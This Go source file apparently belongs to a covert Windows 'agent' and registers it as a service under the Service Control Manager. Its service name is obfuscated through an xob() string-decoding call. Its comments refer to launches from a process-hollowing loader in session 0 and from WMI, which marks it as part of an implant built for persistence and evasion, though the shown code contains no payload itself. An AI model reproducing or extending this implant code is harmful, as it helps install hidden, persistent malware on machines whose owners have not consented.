//go:build windows

package main

import (
	"runtime"
	"time"

	"golang.org/x/sys/windows/svc"
)

type agentService struct{}

func (m *agentService) Execute(args []string, requests <-chan svc.ChangeRequest, changes chan<- svc.Status) (svcSpecific bool, exitCode uint32) {
	changes <- svc.Status{State: svc.StartPending}
	// Agent core runs forever; signal running immediately then block until SCM
	// asks us to stop. We do not expose a stop controller, so the core keeps
	// running and we simply acknowledge Start.
	changes <- svc.Status{State: svc.Running, Accepts: svc.AcceptStop | svc.AcceptShutdown}
	go runAgentCore()

	// If SCM were to request a stop, write a marker so we can see why we quit.
	for c := range requests {
		switch c.Cmd {
		case svc.Interrogate:
			changes <- c.CurrentStatus
		case svc.Stop, svc.Shutdown:
			changes <- svc.Status{State: svc.StopPending}
			return false, 0
		default:
		}
	}
	// r closed: stop core.
	time.Sleep(2 * time.Second)
	exitCode = 0
	return false, exitCode
}

// runAsService runs the agent under the Windows Service Control Manager when
// launched as a real service. Returns true if the agent was handled as a
// service (main should NOT continue to run the agent core), false otherwise.
//
// Any non-service launch (manual run, loader-hollowed child in session 0,
// WMI-spawn) causes svc.Run to return an error — in that case we fall back to
// running the agent core normally so those paths keep working.
func runAsService() bool {
	if runtime.GOOS != "windows" {
		return false
	}
	if interactive, _ := svc.IsAnInteractiveSession(); interactive {
		return false
	}
	// Impersonate via SCM-check: svc.Run returns an error quickly when we are
	// NOT actually started by the Service Control Manager.
	svcName := xob(eSvcName)
	if err := svc.Run(svcName, &agentService{}); err != nil {
		return false
	}
	return true
}
